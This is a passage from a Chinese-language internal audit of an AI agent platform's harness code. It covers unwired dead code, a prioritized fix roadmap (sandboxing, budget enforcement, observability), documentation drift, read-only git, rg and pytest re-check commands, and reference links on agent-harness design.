不成立面:①**执行隔离**(P0-G1/G2)——env 密钥透传+无 OS 沙箱,使「任一被授权 run_command 的 agent 可拿下全平台」,这是当前 Goal-2 不成立的头号原因,优先级高于 RLS 二次验收;②**资源管控**——预算 enforcement 死代码(P1-1),配额是「记录不 enforce」;③RLS stage-3 需要 pre-auth 必修清单+防回潮守卫(P1-G4)+生产登录/CRUD/红队验收。**判定:可达;攻坚序 = 沙箱/env 白名单 → 预算硬门+bare-session 守卫 → RLS 二次验收 → HITL 统一/审计持久化。**

---

## 7. built-but-unwired 死线总账(「绿测试≠完成」全景)

本次审计跨分区共发现 **11 处「代码存在、生产死线」**,集中暴露同一病根:

| # | 死线 | 位置 |
|---|---|---|
| 1 | 429 重试分支不可达(无 raise_for_status) | `llm_client.py:685-697` |
| 2 | `check_user_token_quota` 生产零调用方,quota_message 写死 None | `quota_guard.py:24` |
| 3 | `recovery_manifest.json` 写了无读者(prompt_builder 零引用) | `engine.py:1688-1730` |
| 4 | `build_long_task_resume_context` 唯一消费方是 admin 验证报告 | `long_task_runtime.py:177` |
| 5 | `workflow_completed` 信号生产零消费方 | `workflow_runtime_service.py:944` |
| 6 | subagent 完成唤醒:写内存读 PG,默认配置生产空转 | `coordination_wiring.py:38` |
| 7 | `decide_verified_promotion` 零生产调用方;llm_rubric 不调 LLM | `evolution_verification.py:114` |
| 8 | skill 候选草稿文件全仓无读取方 | `skill_flywheel.py:115` |
| 9 | DREAM.md 模板从未被加载,测试却钉其内容 | `auto_dream.py:1099` |
| 10 | `record_feedback`→calibration→charter proposals 三级死线 | `decision_trace.py:66` |
| 11 | `extract_cache_metrics` 定义后全仓无调用(cache 观测盲) | `prompt_cache.py:233` |

附:`retrieval_eval.py` 无生产调用方、activation 的 retention_score/open_loop 权重无写入方、`sequence_num` 列写入方不赋值,同属此族。**建议在 CI 加一条「公开函数零调用方」的定期盘点(或对每个 feature PR 强制回答验收三查),把这个病根制度化地堵住。**

---

## 8. 攻坚路线(四仗,可并行度高)

**第一仗:雨天工程(失败路径)——「成熟长任务 harness」的本质一仗**
K1 重试矩阵(客户端 withRetry 等价物)→ D1 reconciler 一行过滤 → D2 signal 统一 gateway → D3 timeout 表+spawn 后台化 → P1-3 输出 cap escalate+resume → K2 签名透传 → 流重试清累积器+tombstone 事件 → P1-7 once trigger ack 语义 → P1-8 重启泵(顺手接 P1-9 的 resume context)→ P1-10 完成推送。
*多数是小改动;extract queue 的「enqueue→ack→startup replay」可提为 house pattern 直接套用。*

**第二仗:执行隔离+资源管控(Goal-2 地基)**
G1 env 白名单(立即)→ G2 沙箱(短期 bwrap/mount-namespace 绑定单 agent 目录;中期评估 microVM 路线)→ P1-1 预算硬门(user+tenant fail-closed)→ P1-G4 bare-session AST 守卫 → RLS stage-3 二次验收(按 pre-auth 必修清单 + Testcontainers 红测四件套)→ P2-G7 生产空 master key fail-fast。

**第三仗:进化最后一跳(Goal-1 体感)**
M1 真验证门 → M2 fast_reflection LLM 化 → M3 DREAM.md 裁决 → P1-4 T2 高权重进检索 → P1-5 技能修补通路 → P1-6 update/retire 记忆工具 → P1-D6 机械 lane 补矛盾门 → activation 死权重接通或诚实砍掉 → P1-13 bakeoff 重做成行为级(做完前撤回「已超越」表述)。

**第四仗:可观测地基**
invocation_id 贯通(一表+一 ContextVar,撬动 O1/O2/审计链关联)→ O3 工厂 usage 回调+token_usage_events 表 → P1-11 Prometheus 端点+首批告警 → health 真实化+daemon liveness → P1-12 kernel 三 hook 吞错升级 → CI(现有 pytest 资产直接上 Actions)。
*第四仗建议最先动工——它为前三仗提供验证仪表。*

**cache 经济修复**(C1 迁时钟/热度表出 system、C2 real-usage 锚+CJK cpt、C3 microcompact 空闲语义)可并入第一仗或独立小 PR 串行推进,修复哲学一句话:**CC 上下文管线的组织原则是「prefix 字节稳定 + 真实 token 锚」,Hive 引入了机制但没继承原则。**

---

## 9. 健康面(校准——这些是真的好,部分净超越基准)

- **LoopGuard 三通道语义检测 + warn-before-abort**:CC 没有的能力,Hive 净超越。
- **transient reminder 调度器**(不污染持久转录):对位 CC attachment 通道且实现干净,M1/M2 修复在线。
- **压缩恢复语境分层**(soul/ledger/T3 四文件/近 5 文件×8K/manifest):比 CC 的 5 文件恢复更结构化;压缩摘要 11 字段是 CC 9 节超集+autonomy_run_state(CC 无)。
- **tool result 取回指针进 read_file 闭环**:单条 spill→文件+4K 预览,优于 CC 的 2KB 预览。
- **workflow 引擎质量**:三层 journal+definition hash 校验+外部步 `unknown_requires_reconciliation` 拒自动重放——超越多数自建引擎的正确设计(Temporal 同款语义)。
- **extract queue**:enqueue 先持久→ack 后删→startup replay+幂等 key,全仓最佳 durable 样板,教科书级。
- **治理链**:fail-closed 严谨、无绕过路径(grep 级验证)、CAPABILITY_MAP 全工具覆盖+STRICT fail-closed。
- **多 provider 适配(L3 正资产)**:max_input_tokens hint 全链贯通、PTL 模式串多 provider、cache hints 能力驱动;Anthropic 客户端把尾部 system 降级为 user "[System Notice]" 是现成的 CC system-reminder 形态。
- **蒸馏 SOP prompt 质量**(HEARTBEAT.md/dream JSON prompt):few-shot+反模式+决策矩阵,明显优于 CC extractMemories 与 hermes 的朴素 prompt。
- **D1-D10 偿还**:6 项已修且写门、生命周期、sidecar 遥测的实现质量高。
- **owner 可见性面**(相对最好的观测环):activity+tool-failures 聚合、autonomy overview 带人话映射、evolution 视图。

---

## 10. 文档/记忆漂移更正(审计副产物,需同步)

1. **「T2 无 retention」挂账可销**:吸收标记+30 天归档已上线(`heartbeat.py:1676`、`auto_dream.py:1230-1248`)。
2. **「detached plan 是桩」已过时**:自 06-08 起 detached = once trigger(`plan_mode_detached_handoff.py:34`),但带来 P1-7 的至多一次问题。
3. **「DR flag 禁开」已过时**:DR 专用 flag 已不存在,workflow 单一路径,`WORKFLOW_RUNTIME_ENABLED` 默认 True。
4. **trigger 三桶+objective/focus/supervision 退役 100% 执行完毕**,文档与代码一致,无漂移。
5. **CLAUDE.md「heartbeat 45min」过时**:实际默认 120min(`config.py:126`);`heartbeat.py:591` 注释同陈旧。
6. **sota-plan §2.3 两处过时**:skill_candidate_loop 默认已为 True;dream 已是 24h。
7. **CLAUDE.md 对 DREAM.md 的描述失实**(见 P0-M3);Memory Control Plane 中 feedback→decision 链接能力生产不存在(见 P0-O2)——两处宣称需修正或实现。

---

## 11. 当前 HEAD 复核命令

本节用于防止审计文档再次漂移。每次准备修复或引用本文结论前,先在当前 checkout 上重跑这些只读命令;若输出与本文不一致,以 live code 为准。

```bash
cd /Users/rocky243/vc-saas/hiveclaw-main
git status --short --branch
git rev-parse --short HEAD
git log --oneline -8
```

```bash
cd /Users/rocky243/vc-saas/hiveclaw-main
rg -n "synthetic_signature|HTTPStatusError|resp.status_code >= 400|finish_reason|safe_env = dict\\(os.environ\\)|check_user_token_quota|DecisionTraceStore|_DREAM_TEMPLATE_PATH" backend/app --glob '!backend/tests/**'
rg -n "reconcile_orphaned_runtime_tasks|RuntimeTask.status == \"running\"|_TOOL_TIMEOUTS|get\\(tool_name, 30\\.0\\)|COORDINATION_BACKEND|workflow_completed" backend/app --glob '!backend/tests/**'
rg -n "SCHEMA_DATABASE_URL|RLS_BACKFILL_ON_DEPLOY|grant_rls_app_role|alembic upgrade head|create_all|enter_rls_bypass|tenant_scoped_session" backend/app backend/entrypoint.sh backend/alembic --glob '!backend/tests/**'
```

```bash
cd /Users/rocky243/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_client_token_limits.py tests/services/test_runtime_task_service.py tests/tools/test_service.py tests/services/test_decision_trace.py -q
```

文档编辑本身不要求 TDD;任何后续逻辑修复必须先补回归测试,再改实现。

---

## 附录 A:基准控制元素精要(三方研究全文另存,此处录审计实际引用项)

**Anthropic**:agent loop 四步;Stop hook 续跑(exit 2 喂 stderr 继续干);auto-compact ~83.5% 触发+压缩幸存物白名单(CLAUDE.md/rules/auto memory 重注入,skill 单 5K/总 25K);API context editing(`clear_tool_uses` 默认 input>100K 保最近 3 个);服务端 compaction beta(150K 触发);subagent 摘要回传 1-2K tokens 契约;权限 deny→ask→allow 固定序+OS 沙箱(84% 弹窗削减)+auto mode 分类器(误杀 0.4%/漏放 17% 自报);checkpoints 每 prompt 自动+/rewind 三态恢复;hooks 30 事件;Agent Teams 共享任务表+mailbox+TeammateIdle 质量门;Managed Agents(harness-as-a-service:outcome rubric 迭代/memory store/cron);「成本实证:裸跑 20min/$9 vs 全 harness 6h/$200」。

**OpenAI**:harness 四部分结构(loop/Thread 持久化/Config/工具+策略);「Humans steer. Agents execute.」(5 个月 100 万行/1500 PR/人均 3.5 PR/天/单 run 6h+);compaction 训练进权重(Codex-Max 跨窗自动压缩「repeats until the task is completed」,>24h);sandbox_mode 三档+approval_policy 四档(模型可自带 justification 申请脱沙箱)+network 默认断;AGENTS.md = ~100 行地图非手册(progressive disclosure);Temporal 集成 = 每次 agent 调用一个 Activity(crash 续跑/rate-limit 自动等待);tracing 默认开 Trace→Span;guardrails input 跑首 agent/output 跑末 agent;「机械强制>文档」(linter 错误消息内写修复指引注入 agent 上下文)。

**社区**:Agent=Model+Harness;Guides+Sensors 双面;12-factor(own context window/统一执行态与业务态/launch-pause-resume API/用 tool call 联系人类);长任务 TOP:状态外置+append-only 重放、KV-cache 稳定前缀纪律(10 倍成本差)、文件系统外部记忆+压缩可恢复、recitation 对抗目标漂移、外部验证判停禁自评、跨会话交接文件、保留错误上下文、细粒度检查点+interrupt 一等、单线程优先、防 few-shot 僵化、组件标注补偿缺陷定期删、预算压力显式注入;企业五件套 = 身份/生命周期/权限/预算/审计+执行点强制+append-only;隔离基线上移 microVM。

## 附录 B:引用清单(可复核 URL 节选)

本文不要求读者相信二手转述。至少以下一手或准一手来源可直接复核本文采用的 harness 尺子:

**Anthropic / Claude**
- Demystifying evals for AI agents: <https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents>
- Effective harnesses for long-running agents: <https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents>
- Harness design for long-running application development: <https://www.anthropic.com/engineering/harness-design-long-running-apps>
- Scaling Managed Agents: <https://www.anthropic.com/engineering/managed-agents>
- Building agents with the Claude Agent SDK: <https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk>

**OpenAI**
- Agents SDK guide: <https://developers.openai.com/api/docs/guides/agents>
- Running agents: <https://developers.openai.com/api/docs/guides/agents/running-agents>
- Guardrails and human review: <https://developers.openai.com/api/docs/guides/agents/guardrails-approvals>
- Orchestration and handoffs: <https://developers.openai.com/api/docs/guides/agents/orchestration>
- Integrations and observability: <https://developers.openai.com/api/docs/guides/agents/integrations-observability>
- New tools for building agents: <https://openai.com/index/new-tools-for-building-agents/>

**社区 / runtime 实践**
- LangGraph overview: <https://docs.langchain.com/oss/python/langgraph/overview>
- LangGraph persistence: <https://docs.langchain.com/oss/python/langgraph/persistence>
- LangGraph interrupts: <https://docs.langchain.com/oss/python/langgraph/interrupts>
- LangGraph checkpointers: <https://docs.langchain.com/oss/javascript/langgraph/checkpointers>
- LangGraph / Deep Agents production note: <https://docs.langchain.com/oss/python/deepagents/going-to-production>

---

*审计执行:2026-06-11,9 路并行(3 外部基准 + 6 内部分区),主审对 6 个分区各抽 1 条最高严重度 P0 亲读代码复核,6/6 属实。各分区完整报告(含全部 P1/P2 与逐镜头对照表)存于审计会话记录。*
